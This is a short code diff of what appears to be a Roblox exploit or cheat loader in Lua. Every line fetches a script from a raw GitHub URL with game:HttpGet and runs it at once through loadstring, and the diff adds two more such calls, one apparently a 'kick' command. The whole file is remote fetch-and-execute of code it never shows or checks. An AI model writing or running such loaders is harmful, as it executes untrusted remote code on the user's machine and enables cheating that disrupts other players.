@@ -4,3 +4,5 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/ssopadepollo/seriusly
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ssopadepollo/puro1/main/arbolggiante", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ssopadepollo/crystalicaca/main/ohhyeahhh", true))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ssopadepollo/farmpes/main/siuuu", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ssopadepollo/comds/main/kick", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ssopadepollo/exposed/main/lol", true))()
